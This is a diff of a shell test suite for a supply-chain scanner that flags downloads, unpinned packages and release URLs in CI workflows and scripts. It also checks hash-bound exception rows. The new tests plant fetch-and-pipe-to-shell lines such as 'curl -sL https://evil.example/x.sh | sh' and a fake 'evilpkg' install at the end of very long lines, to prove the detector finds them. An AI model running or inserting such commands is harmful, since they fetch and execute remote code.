@@ -396,12 +396,7 @@ spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importl
 t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
 for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
     inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
-try:
-    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})
-except RuntimeError as e:
-    assert "refusing to read it partially" in str(e)
-else:
-    raise AssertionError("an over-long command line was read as its prefix")
+inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})   # a command line is read whole, whatever its length
 assert time.process_time() - t < 3, time.process_time() - t
 PY
 CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
@@ -542,19 +537,13 @@ import importlib.util, os, subprocess, sys, time
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
 t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
 for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
-    try:
-        fn()
-    except RuntimeError as e:
-        assert "refusing to read it partially" in str(e)     # one enormous line is refused outright, quickly
+    fn()                                                     # one enormous line is read whole (no length cap), quickly
 assert time.process_time() - t < 3, time.process_time() - t
-# a long ordinary pip install with a dependency appended after 4000 characters is REFUSED, never read as its prefix
+# a long ordinary pip install with a dependency appended after 4000 characters is read whole: the last dependency is found
 pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
-try:
-    inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
-except RuntimeError:
-    pass
-else:
-    raise AssertionError("an overlong pip install was accepted")
+got = inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
+assert any(k.startswith("package:pypi/evilpkg@9.9.9") for k in got), sorted(got)[-3:]
+assert any(k.startswith("package:pypi/pkg399@1.0.399") for k in got), sorted(got)[-3:]
 repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
 subprocess.run(["git", "init", "-q", repo], check=True)
 open(repo + "/big.sh", "w").write("# x\n" * 300000)
@@ -650,9 +639,66 @@ done
 agentfile pyrelplain .github/agent/rel.py "import json"$'\n'"URL = '$RU'"$'\n'"print(URL)"$'\n'
 CASE="AC2: a .py file with a release URL and NO network client import (only print(URL)) has no download finding: exit 0"
 check test "$rc" -eq 0; check test "$(grep -c 'FAIL' "$work/pyrelplain.out")" -eq 0
-agentfile agentlong .github/agent/l.sh "#!/bin/sh"$'\n'"echo $(printf 'a%.0s' $(seq 4100))"$'\n'
-CASE="a command line of 4100 characters makes the scan stop (exit 2), never read in part"
-check test "$rc" -eq 2; check grep -q 'is longer than the 4000 this check reads' "$work/agentlong.out"
+# --- REQ-SUP-001-AC2 (row 2 of the ruling): a network client is found by Python's own parser (import statements, any alias, any
+# statement layout); the finding is the line that names the release URL
+pyast() { # NAME TEXT-WITH-ESCAPES: .github/agent/rel.py holds TEXT (printf %b) at the head
+  agentfile "$1" .github/agent/rel.py "$(printf '%b' "$2")"$'\n'
+}
+pyfind() { # NAME TEXT DESCRIPTION: a release-URL line of a file importing a client in that layout is a finding (exit 1, named)
+  pyast "$1" "$2"; CASE="AC2 parser: a release URL line of a .py file with $3 is a finding: exit 1, unmeasured"
+  check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/$1.out"
+}
+pyfind pyast1 "import os; import httpx as h\nh.get('$RU')" "'import os; import httpx as h' on one line"
+pyfind pyast2 "import os, \\\\\n    requests\nrequests.get('$RU')" "a backslash-continued import (import os, \\\\ requests)"
+pyfind pyast3 "import \\\\\n    requests\nrequests.get('$RU')" "a backslash after the import keyword"
+pyfind pyast4 "from requests import (\n    get,\n    post,\n)\nget('$RU')" "a parenthesized from-import"
+pyfind pyast5 "def fetch():\n    import requests\n    return requests.get('$RU')" "an import inside a function"
+pyfind pyast6 "\"\"\"fetch the release.\"\"\"\nimport requests\nrequests.get('$RU')" "an import after a docstring"
+pyfind pyast7 "import urllib3 as u3\nu3.PoolManager().request('GET', '$RU')" "urllib3 under an alias"
+pyfind pyast8 "from urllib import request as rq\nrq.urlopen('$RU')" "from urllib import request (aliased)"
+pyfind pyast9 "from http import client\nU = '$RU'" "from http import client and the URL on a line of its own"
+pyfind pyast10 "import http.client as hc\nU = '$RU'" "import http.client as an alias and the URL on a line of its own"
+pyfind pyast11 "from urllib.request import urlopen as uo\nU = '$RU'" "from urllib.request import ... as an alias"
+pyfind pyast12 "try:\n    import httpx\nexcept ImportError:\n    httpx = None\nU = '$RU'" "an import inside try"
+pyfind pyast13 "if True:\n    from httpx import get as g\nU = '$RU'" "a from-import of httpx inside an if block"
+pyast pyast14 "import requests\nU1 = '$RU'\nU2 = '${RU/v1.2.3/v1.2.4}'"
+CASE="AC2 parser: every release-URL line of the file is a finding: both lines are named (two unmeasured lines)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured:.github/agent/rel.py' "$work/pyast14.out")" -ge 2
+pyast pyastc1 "import json\n# import requests\nS = 'import requests'\nT = \"\"\"\nimport httpx\n\"\"\"\nU = '$RU'"
+CASE="AC2 parser control: 'import requests' inside a comment, a string and a triple-quoted string is not an import: no finding (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'FAIL' "$work/pyastc1.out")" -eq 0
+pyast pyastc2 "import json\nimport mypkg.requests_like\nfrom os import path\nU = '$RU'"
+CASE="AC2 parser control: imports of modules that merely look like a client (mypkg.requests_like) are not a client import: no finding (exit 0)"
+check test "$rc" -eq 0
+pyast pyastbad "def broken(:\n    U = '$RU'"
+CASE="AC2 parser: a .py file the parser cannot read counts as importing a client: its release-URL line is a finding (exit 1)"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyastbad.out"
+pyast pyastbadc "x = (\nU = '$RU'"
+CASE="AC2 parser: an unterminated parenthesis (unreadable file) counts as importing a client: exit 1"
+check test "$rc" -eq 1
+
+longline() { python3 -c 'import sys; n, t = int(sys.argv[1]), sys.argv[2]; print("echo " + "a" * (n - 5 - len(t)) + t, end="")' "$1" "$2"; }   # echo, then a line of exactly N characters ending in TAIL
+agentfile agentlong .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 4529 '; curl -sL https://evil.example/x.sh | sh')"$'\n'
+CASE="a script line of 4529 characters is read whole: a download at its end is found (exit 1, unmeasured), no 'longer than' refusal"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/l.sh' "$work/agentlong.out"
+check test "$(grep -c 'longer than' "$work/agentlong.out")" -eq 0
+agentfile agentlong9 .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 9100 '; curl -sL https://evil.example/x.sh | sh')"$'\n'
+CASE="a script line over 9000 characters is read whole: a download at its end is found (exit 1, unmeasured), no 'longer than' refusal"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/l.sh' "$work/agentlong9.out"
+check test "$(grep -c 'longer than' "$work/agentlong9.out")" -eq 0
+agentfile agentlongpip .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 4529 '; pip install evilpkg==9.9.9')"$'\n'
+CASE="a script line of 4529 characters with a pip install at its end: the dependency is found and named (exit 1, age not provable)"
+check test "$rc" -eq 1; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/agentlongpip.out"
+newcase wflong "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 4529 ' && pip install evilpkg==9.9.9 && curl -fsSL https://evil.example/x.sh | sh')"$'\n      - run: |')"
+runck wflong '{"times": {}}'
+CASE="a workflow run step of 4529 characters is read whole: the dependency and the download at its end are found, no 'longer than' refusal"
+check test "$rc" -eq 1; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/wflong.out"; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/wflong.out"
+check test "$(grep -c 'longer than' "$work/wflong.out")" -eq 0
+newcase wflong9 "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 9100 ' && pip install evilpkg==9.9.9')"$'\n      - run: |')"
+runck wflong9 '{"times": {}}'
+CASE="a workflow run step over 9000 characters is read whole: the dependency at its end is found, no 'longer than' refusal"
+check test "$rc" -eq 1; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/wflong9.out"
+check test "$(grep -c 'longer than' "$work/wflong9.out")" -eq 0
 agentfile agentshort .github/agent/l.sh "#!/bin/sh"$'\n'"echo $(printf 'a%.0s' $(seq 3900))"$'\n'
 CASE="a command line of 3900 characters is read: the check runs (exit 0)"
 check test "$rc" -eq 0
@@ -2060,34 +2106,29 @@ for r in rows:
         stale.append((r["file"], r["key"][:12]))
 assert not stale, ("rows that bind no line of their file", stale)
 PY
-CASE="every committed row that carries a body hash binds a span its file holds exactly once, "\
-"with every copy of the line inside it"
+CASE="every committed row that carries a body hash has body-sha256 alone (no body-first, no body-last), and it is the sha256 of the lines "\
+"'<path> <sha256 of the file>': the row's file first, then the files it sources by a literal path, by path"
 check python3 - "$root" "$root/.github/supply-chain-exceptions.json" <<'PY'
-import hashlib, json, os, sys
-H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
-def spans(lines, first, last, sha):
-    found = []
-    for i, a in enumerate(lines):
-        if a != first:
+import hashlib, json, os, re, sys
+SRC = re.compile(r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*(?:source|\.)\s+([^\s;&|)]+)")
+def sourced(text):
+    return [m.group(1) for l in text.split("\n") if not l.lstrip().startswith("#")
+            for m in SRC.finditer(l) if not re.search(r"""[$"'\\`*?\[\]{}~]""", m.group(1))]
+def body_hash(root, first):
+    seen, todo = {}, [first]
+    while todo:
+        path = todo.pop()
+        if path in seen:
             continue
-        h = hashlib.sha256()
-        for j in range(i, len(lines)):
-            h.update((lines[j] if j == i else "\n" + lines[j]).encode("utf-8", "replace"))
-            if lines[j] == last and h.copy().hexdigest() == sha:
-                found.append((i, j))
-    return found
-rows = [r for r in json.load(open(sys.argv[2]))["unmeasured_text"] if "body-sha256" in r]
+        full = os.path.join(root, path)
+        seen[path] = open(full, "rb").read() if os.path.isfile(full) else None
+        if seen[path] is not None:
+            todo += sourced(seen[path].decode("utf-8", "replace"))
+    out = "".join("%s %s\n" % (p, hashlib.sha256(seen[p]).hexdigest()) for p in [first] + sorted(set(seen) - {first}) if seen[p] is not None)
+    return hashlib.sha256(out.encode()).hexdigest()
+rows = [r for r in json.load(open(sys.argv[2]))["unmeasured_text"] if "body-sha256" in r or "body-first" in r or "body-last" in r]
 assert rows, "no row carries a body hash"
-bad, files = [], {}
-for r in rows:
-    if r["file"] not in files:
-        with open(os.path.join(sys.argv[1], r["file"]), "rb") as f:
-            files[r["file"]] = f.read().decode("utf-8", "replace").split("\n")
-    lines = files[r["file"]]
-    found = spans(lines, r["body-first"], r["body-last"], r["body-sha256"])
-    copies = [n for n, line in enumerate(lines) if H(" ".join(line.split())) == r["line"]]
-    if len(found) != 1 or not copies or not all(found[0][0] <= n <= found[0][1] for n in copies):
-        bad.append((r["file"], r["key"][:12], len(found), len(copies)))
+bad = [(r["file"], r["key"][:12]) for r in rows if "body-first" in r or "body-last" in r or r["body-sha256"] != body_hash(sys.argv[1], r["file"])]
 assert not bad, (len(bad), bad[:5])
 PY
 CASE="every committed live-fetch row is one of the three fetch lines of bin/refresh-inputs.sh: the test holds each line's text, its hashes match the row, the checker's own live-fetch rule accepts it, and the same line with another program is refused"
@@ -2257,7 +2298,7 @@ for r in rows:
         assert re.search(r"alpine:[0-9.]+@sha256:[0-9a-f]{64}", pre), "the image of the container is not pinned by digest"
 PY
 CASE="AC16: the committed unmeasured_text rows load, and each has file, form, key and line (64 lowercase hex each), "\
-"a ruling, and at most a count and the three body fields (all three or none), under .github/agent/ as anywhere"
+"a ruling, and at most a count and body-sha256, under .github/agent/ as anywhere"
 check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
 import importlib.util, json, re, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
@@ -2269,12 +2310,10 @@ for r in calls:
     assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["file"].startswith(".github/workflows/") and r["ruling"].startswith("local reusable workflow call; "), r
 rows = [r for r in allrows if r["form"] != "a local reusable workflow call"]
 forms = {"a download", ac.UNPINNED_FORM} | {w for _, w in ac.inv._UNMEASURED}
-BODY = ("body-first", "body-last", "body-sha256")
+BODY = ("body-sha256",)
 for r in rows:
     assert set(r) - {"count", *BODY} == {"file", "form", "key", "line", "ruling"}, r
     assert type(r.get("count", 1)) is int and 1 <= r.get("count", 1) <= 100, r
-    assert set(r) & set(BODY) in (set(), set(BODY)), ("the body fields come all three or none", r)
-    assert all(isinstance(r.get(k, "x"), str) and r.get(k, "x").strip() for k in BODY[:2]), r
     assert re.fullmatch(r"[0-9a-f]{64}", r.get("body-sha256", "0" * 64)), r
     assert re.fullmatch(r"[0-9a-f]{64}", r["line"]), r
     assert r["file"] and not r["file"].startswith("/") and r["form"] in forms, r
@@ -2284,26 +2323,37 @@ for r in rows:
     assert re.fullmatch(r"[0-9a-f]{64}", r["key"]) and pre and len(r["ruling"]) > len(pre) + 10, r
 PY
 
-# --- REQ-SUP-001-AC16, a row rules its line by exact (file, key, line hash). It may carry body-first, body-last and
-# body-sha256, all three or none: the line is then ruled only when exactly one span of the head file has that hash and
-# every copy of the line sits inside it. No other field (no context, no proof) is part of a row. ---
+# --- REQ-SUP-001-AC16, a row rules its line by exact (file, key, line hash). It may carry body-sha256: the line is then ruled only when
+# the sha256 of the lines '<path> <sha256 of the file's bytes>' (the row's file first, then the files it sources by a literal path, by path, each
+# line ending in a newline) equals it. Any change to a reviewed file is a change of its text: the row stops matching. No other field (no
+# context, no proof, no body-first, no body-last) is part of a row. ---
 BHL='echo "curl $*" >>"$CALLS"'
 BHO="cat >stub <<'EOF'"
-BHC=$'#!/bin/sh\n# fake <<\'EOF\'\n'"$BHL"$'\n# EOF\n'
-# bhf FIRST LAST SPAN [OVERRIDE_JSON [DROPPED_KEY...]]: the body fields of the span SPAN (lines joined by newlines)
-bhf() {
+# bhx PATH CONTENT [PATH CONTENT]...: the body hash of those files (the first is the row's file; the rest by path); a CONTENT of @absent
+# stands for a file that is no file of the tree: BHABS picks how the hash holds it (none: no line, absent: '<path> absent', empty: the sum of nothing)
+bhx() {
   python3 - "$@" <<'PY'
-import hashlib, json, sys
-first, last, span = sys.argv[1:4]
-fields = {"body-first": first, "body-last": last, "body-sha256": hashlib.sha256(span.encode()).hexdigest()}
-fields.update(json.loads(sys.argv[4]) if len(sys.argv) > 4 else {})
-print(json.dumps({k: v for k, v in fields.items() if k not in sys.argv[5:]}))
+import hashlib, os, sys
+args = sys.argv[1:]
+pairs = list(zip(args[0::2], args[1::2]))
+first, rest = pairs[0], sorted(pairs[1:])
+enc = os.environ.get("BHABS", "none")
+out = ""
+for path, text in [first] + rest:
+    if text == "@absent":
+        out += {"none": "", "absent": path + " absent\n", "empty": path + " " + hashlib.sha256(b"").hexdigest() + "\n"}[enc]
+    else:
+        out += path + " " + hashlib.sha256(text.encode()).hexdigest() + "\n"
+print(hashlib.sha256(out.encode()).hexdigest())
 PY
 }
-# bhrun NAME CONTENT EXTRA: bin/bh.sh = CONTENT at the head; the row is the real scan's row plus the EXTRA json fields
+bhh() { printf '{"body-sha256": "%s"}' "$(bhx "$@")"; }   # the same as the row's JSON
+# bhrun NAME EXTRA PATH TEXT [PATH TEXT]...: the head holds those files; the row is the real scan's row plus the EXTRA json fields
 bhrun() {
-  newcase "$1" "$(pyw bin/bh.sh "$2")"
-  bhrow "$1" "$3"
+  bhn=$((${bhn:-0}+1)); local n=bhc$bhn extra=$2 code=""; shift 2   # the case directory is numbered: a label may hold any character
+  while [ $# -ge 2 ]; do [ "$2" = "@absent" ] || code+="$(pyw "$1" "$2")"$'\n'; shift 2; done
+  newcase "$n" "$code"
+  bhrow "$n" "$extra"
 }
 bhrow() { # NAME EXTRA: case NAME is built; its row is the real scan's plus the EXTRA json fields; bh_ms = wall time
   rtrows "$work/$1" "$work/bh-$1.tmp.json" all
@@ -2320,55 +2370,89 @@ PY
     --exceptions "$work/bh-$1.json" >"$work/bh.out" 2>&1 || rc=$?
   bh_ms=$(( ($(date +%s%N) - t0) / 1000000 ))
 }
-bhyes() { # NAME CONTENT EXTRA: the line is ruled
+bhyes() { # NAME EXTRA PATH TEXT...: the line is ruled
   bhrun "$@"; CASE="AC16 body rows: $1: ruled (exit 0)"
   check test "$rc" -eq 0; check grep -q 'ruled text' "$work/bh.out"
 }
-bhno() { # NAME CONTENT EXTRA: the line is not ruled
+bhno() { # NAME EXTRA PATH TEXT...: the line is not ruled
   bhrun "$@"; CASE="AC16 body rows: $1: rules nothing (exit 1, the line fails as unmeasured)"
   check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/bh.sh' "$work/bh.out"
   check test "$(grep -c 'ruled text' "$work/bh.out")" -eq 0
 }
-bhbad() { # NAME CONTENT EXTRA: the file is malformed (exit 2, naming the rows and the body fields)
+bhbad() { # NAME EXTRA PATH TEXT...: the file is malformed (exit 2, naming the rows)
   bhrun "$@"; CASE="AC16 body rows: $1: stops the check (exit 2, never a pass) and names the row"
   check test "$rc" -eq 2; check grep -q 'unmeasured_text row' "$work/bh.out"; check grep -qi 'not a pass' "$work/bh.out"
 }
-BH1=$'#!/bin/sh\ncat >stub <<\'EOF\'\n'"$BHL"$'\nEOF\n'
-BH2=$'#!/bin/sh\ncat >stub <<\'EOF\'\n'"$BHL"$'\necho second\nEOF\n'
-BH3=$'#!/bin/sh\ncat >stub <<\'EOF\'\n'"$BHL"$'\nEOF\ncat >stub <<\'EOF\'\n'"$BHL"$'\nEOF\n'
-BH4=$'#!/bin/sh\ncat >stub <<\'EOF\'\n'"$BHL"$'\necho seconD\nEOF\n'
-BH5=$'#!/bin/sh\ncat >stub <<\'EOF\'\n'"$BHL"$'\nEOF\n'"$BHL"$'\n'
-SP1="$BHO"$'\n'"$BHL"$'\nEOF'
-SP2="$BHO"$'\n'"$BHL"$'\necho second\nEOF'
-SPC=$'# fake <<\'EOF\'\n'"$BHL"$'\n# EOF'
-bhyes "a row without the three fields is a plain per-line row: it rules its line in a heredoc" "$BH1" '{}'
-bhyes "a plain per-line row still rules the line after the heredoc body changed" "$BH2" '{}'
-bhyes "the three fields of the heredoc span (its opener to its EOF) rule its line" "$BH1" "$(bhf "$BHO" EOF "$SP1")"
-BH6=$'#!/bin/sh\ncat >stub <<\'EOF\'\n'"$BHL"$'\nEOF\necho second\nEOF\n'
-SP6="$BHO"$'\n'"$BHL"$'\nEOF\necho second\nEOF'
-bhyes "a body line equal to body-last does not end the search: the span runs to a LATER line equal to it whose text hashes to body-sha256" "$BH6" "$(bhf "$BHO" EOF "$SP6")"
-bhyes "a span of two body lines is hashed as its lines joined by a newline" "$BH2" "$(bhf "$BHO" EOF "$SP2")"
-bhyes "a one-line body: the span is the line itself" "$BH1" "$(bhf "$BHL" "$BHL" "$BHL")"
-bhyes "the span is the one the row names, never a guess of where a here-document is (a comment that looks like one)" \
-  "$BHC" "$(bhf "# fake <<'EOF'" "# EOF" "$SPC")"
-bhno "a span edited by one character since the row was written" "$BH4" "$(bhf "$BHO" EOF "$SP2")"
-bhno "a span that appears twice in the file" "$BH3" "$(bhf "$BHO" EOF "$SP1" '{"count": 2}')"
-bhno "a copy of the line outside the span" "$BH5" "$(bhf "$BHO" EOF "$SP1" '{"count": 2}')"
-bhno "a body-first that no line of the file is" "$BH1" "$(bhf "cat >other <<'EOF'" EOF "$SP1")"
-bhno "a body-last that no line of the file is" "$BH1" "$(bhf "$BHO" "END" "$SP1")"
+F0=$'#!/bin/sh\n'"$BHL"$'\n'
+FH=$'#!/bin/sh\ncat >stub <<\'EOF\'\n'"$BHL"$'\nEOF\n'
+FS=$'#!/bin/sh\n. bin/lib.sh\n'"$BHL"$'\n'
+LIB=$'helper() { :; }\n'
+bhyes "a row without body-sha256 is a plain per-line row: it rules its line in a heredoc" '{}' bin/bh.sh "$FH"
+bhyes "a plain per-line row rules its line whatever else the file holds (a second line added)" '{}' bin/bh.sh "$F0"$'echo second\n'
+bhyes "control: the row holds the hash of the whole file: it rules its line" "$(bhh bin/bh.sh "$F0")" bin/bh.sh "$F0"
+bhyes "control: the whole-file hash of a file holding a heredoc rules its line" "$(bhh bin/bh.sh "$FH")" bin/bh.sh "$FH"
+bhyes "control: a comment line saying 'source' or '. bin/lib.sh' does not count as a source: the file alone is bound" \
+  "$(bhh bin/bh.sh "$F0"$'# . bin/lib.sh\n# source bin/lib.sh\n')" bin/bh.sh "$F0"$'# . bin/lib.sh\n# source bin/lib.sh\n' bin/lib.sh "$LIB"
+bhno "one byte changed in a comment above the line since the row was reviewed" \
+  "$(bhh bin/bh.sh $'#!/bin/sh\n# note 1\n'"$BHL"$'\n')" bin/bh.sh $'#!/bin/sh\n# note 2\n'"$BHL"$'\n'
+bhno "a line added above the reviewed text" "$(bhh bin/bh.sh "$F0")" bin/bh.sh $'#!/bin/sh\nset -e\n'"$BHL"$'\n'
+bhno "a line added below the reviewed text" "$(bhh bin/bh.sh "$F0")" bin/bh.sh "$F0"$'echo more\n'
+bhno "a wrapper defined above the line (check() { eval ...; })" "$(bhh bin/bh.sh "$F0")" bin/bh.sh $'#!/bin/sh\ncheck() { eval "$@"; }\n'"$BHL"$'\n'
+bhno "a function redefined after a separator below the line (echo x; echo() { :; })" "$(bhh bin/bh.sh "$F0")" bin/bh.sh "$F0"$'echo x; echo() { :; }\n'
+bhno "a shadowed grep() defined below the line" "$(bhh bin/bh.sh "$F0")" bin/bh.sh "$F0"$'grep() { return 0; }\n'
+bhno "a use of the written stub below the line (bash stub)" "$(bhh bin/bh.sh "$FH")" bin/bh.sh "$FH"$'bash stub\n'
+bhno "a use of the written stub above the heredoc" "$(bhh bin/bh.sh "$FH")" bin/bh.sh $'#!/bin/sh\nbash stub\ncat >stub <<\'EOF\'\n'"$BHL"$'\nEOF\n'
+bhno "a spelling trick: the reviewed text with CRLF line endings" "$(bhh bin/bh.sh "$F0")" bin/bh.sh "${F0//$'\n'/$'\r\n'}"
+bhno "a body hash of the bare file bytes (no '<path> <sha>' line) is not the row's hash" \
+  "{\"body-sha256\": \"$(printf %s "$F0" | sha256sum | cut -d' ' -f1)\"}" bin/bh.sh "$F0"
+bhno "a body hash of the line without its closing newline is not the row's hash" \
+  "{\"body-sha256\": \"$(printf 'bin/bh.sh %s' "$(printf %s "$F0" | sha256sum | cut -d' ' -f1)" | sha256sum | cut -d' ' -f1)\"}" bin/bh.sh "$F0"
 zeros=$(printf '0%.0s' $(seq 64))
-bhno "a body hash of nothing that holds the line" "$BH1" "$(bhf "$BHO" EOF "$SP1" "{\"body-sha256\": \"$zeros\"}")"
-bhno "a trailing newline in the hashed span is not the span" "$BH1" "$(bhf "$BHO" EOF "$SP1"$'\n')"
-for keep in body-first body-last body-sha256 "body-first body-last" "body-first body-sha256" "body-last body-sha256"; do
-  drop=$(printf '%s\n' body-first body-last body-sha256 | grep -vxF -f <(printf '%s\n' $keep) | tr '\n' ' ')
-  bhbad "a row with only $keep of the three body fields" "$BH1" "$(bhf "$BHO" EOF "$SP1" '{}' $drop)"
+bhno "a body hash of nothing that holds the file" "{\"body-sha256\": \"$zeros\"}" bin/bh.sh "$F0"
+# a file sourced by a literal path is bound too
+bhyes "control: a file that sources bin/lib.sh by a literal path is bound with it: the row holds both lines and rules its line" \
+  "$(bhh bin/bh.sh "$FS" bin/lib.sh "$LIB")" bin/bh.sh "$FS" bin/lib.sh "$LIB"
+bhyes "control: the source keyword binds the sourced file like the dot" \
+  "$(bhh bin/bh.sh "${FS/. bin/source bin}" bin/lib.sh "$LIB")" bin/bh.sh "${FS/. bin/source bin}" bin/lib.sh "$LIB"
+bhyes "control: a source after a semicolon, after then and after do binds the sourced file too" \
+  "$(bhh bin/bh.sh $'#!/bin/sh\ntrue; . bin/lib.sh\nif true; then . bin/lib2.sh; fi\nfor i in 1; do source bin/lib3.sh; done\n'"$BHL"$'\n' bin/lib.sh "$LIB" bin/lib2.sh "$LIB" bin/lib3.sh "$LIB")" \
+  bin/bh.sh $'#!/bin/sh\ntrue; . bin/lib.sh\nif true; then . bin/lib2.sh; fi\nfor i in 1; do source bin/lib3.sh; done\n'"$BHL"$'\n' bin/lib.sh "$LIB" bin/lib2.sh "$LIB" bin/lib3.sh "$LIB"
+bhno "the sourced file is changed since the row was reviewed (a function redefined in it)" \
+  "$(bhh bin/bh.sh "$FS" bin/lib.sh "$LIB")" bin/bh.sh "$FS" bin/lib.sh $'helper() { :; }\necho() { :; }\n'
+bhno "a row that hashes the sourcing file alone: the sourced file is part of the text, so the row does not match" \
+  "$(bhh bin/bh.sh "$FS")" bin/bh.sh "$FS" bin/lib.sh "$LIB"
+bhyes "control: the files are read to any depth: bin/lib.sh sources bin/lib2.sh, and the row holds all three" \
+  "$(bhh bin/bh.sh "$FS" bin/lib.sh $'. bin/lib2.sh\n' bin/lib2.sh "$LIB")" bin/bh.sh "$FS" bin/lib.sh $'. bin/lib2.sh\n' bin/lib2.sh "$LIB"
+bhno "a file sourced two levels down is changed since the row was reviewed" \
+  "$(bhh bin/bh.sh "$FS" bin/lib.sh $'. bin/lib2.sh\n' bin/lib2.sh "$LIB")" bin/bh.sh "$FS" bin/lib.sh $'. bin/lib2.sh\n' bin/lib2.sh $'helper() { return 1; }\n'
+bhno "a sourced file added since the row was reviewed (the row holds the file alone)" \
+  "$(bhh bin/bh.sh "$F0")" bin/bh.sh $'#!/bin/sh\n. bin/lib.sh\n'"$BHL"$'\n' bin/lib.sh "$LIB"
+bhno "a literal source that was a file when the row was reviewed is no file of the tree now (binds as absent)" \
+  "$(bhh bin/bh.sh "$FS" bin/lib.sh "$LIB")" bin/bh.sh "$FS"
+for enc in none absent empty; do   # the hash of a literal operand that is no file of the tree: some one encoding of "absent" rules the line
+  BHABS=$enc bhrun "bhabs-$enc" "$(BHABS=$enc bhh bin/bh.sh "$FS" bin/lib.sh @absent)" bin/bh.sh "$FS"
+  echo "$rc" >"$work/bhabs-$enc.rc"
 done
-bhsum() { printf %s "$1" | sha256sum | cut -d' ' -f1; }
-sha=$(bhsum "$SP1")
-for bad in '"body-sha256": ""' '"body-sha256": null' '"body-sha256": 5' '"body-sha256": ["a"]' '"body-first": ""' \
-  '"body-first": null' '"body-first": 5' '"body-last": ""' '"body-last": ["EOF"]' "\"body-sha256\": \"${sha:1}\"" \
-  "\"body-sha256\": \"${sha^^}\"" '"context": "heredoc"' '"context": "comment", "proof": "x"' '"proof": "x"'; do
-  bhbad "a row with all three fields and $bad" "$BH1" "$(bhf "$BHO" EOF "$SP1" "{$bad}")"
+CASE="AC16 body rows: a literal source operand that is no file of the tree binds as absent and still rules its line (one of the absent encodings holds: exit 0, ruled)"
+check grep -qx 0 "$work/bhabs-none.rc" "$work/bhabs-absent.rc" "$work/bhabs-empty.rc"
+bhno "an absent literal source that is a file at the head (the row was written when it was absent)" \
+  "$(BHABS=none bhh bin/bh.sh "$FS" bin/lib.sh @absent)" bin/bh.sh "$FS" bin/lib.sh "$LIB"
+# a source by a non-literal operand rules nothing
+for op in '"$DIR/lib.sh"' '$DIR/lib.sh' '"$(dirname "$0")/lib.sh"' '$(dirname $0)/lib.sh' '`dirname $0`/lib.sh' 'bin/*.sh' 'bin/lib.{sh,env}' '"bin/lib.sh"' "'bin/lib.sh'" 'bin/li\b.sh'; do
+  FN=$'#!/bin/sh\n. '"$op"$'\n'"$BHL"$'\n'
+  bhno "a file sourcing by a non-literal operand ($op) rules nothing even with the row of its whole file" "$(bhh bin/bh.sh "$FN")" bin/bh.sh "$FN" bin/lib.sh "$LIB"
+done
+bhno "a sourced file that itself sources by a non-literal operand rules nothing" "$(bhh bin/bh.sh "$FS" bin/lib.sh $'. "$1"\n')" bin/bh.sh "$FS" bin/lib.sh $'. "$1"\n'
+# the fields of a row: body-sha256 only
+BH0=$(bhx bin/bh.sh "$F0")
+for bad in '"body-first": "x"' '"body-last": "x"' '"body-first": "#!/bin/sh", "body-last": "echo"' '"body-first": "#!/bin/sh", "body-last": "echo", "body-sha256": ""'; do
+  bhbad "a row with the old span field(s) ($bad) is malformed" "{\"body-sha256\": \"$BH0\", $bad}" bin/bh.sh "$F0"
+done
+bhbad "a row with body-first and no body-sha256 is malformed" '{"body-first": "#!/bin/sh"}' bin/bh.sh "$F0"
+bhbad "a row with body-first and body-last and no body-sha256 is malformed" '{"body-first": "#!/bin/sh", "body-last": "#!/bin/sh"}' bin/bh.sh "$F0"
+for bad in '"body-sha256": ""' '"body-sha256": null' '"body-sha256": 5' '"body-sha256": ["a"]' "\"body-sha256\": \"${BH0:1}\"" \
+  "\"body-sha256\": \"${BH0^^}\"" '"context": "heredoc"' '"context": "comment", "proof": "x"' '"proof": "x"'; do
+  bhbad "a row with $bad is malformed" "{$bad}" bin/bh.sh "$F0"
 done
 
 # --- REQ-SUP-001-AC2: the finding is the line that names the release URL (its text), never the import line
@@ -2387,46 +2471,18 @@ rtrows "$work/r2" "$work/r2new.json" all; edck r2 "$work/r2new.json"
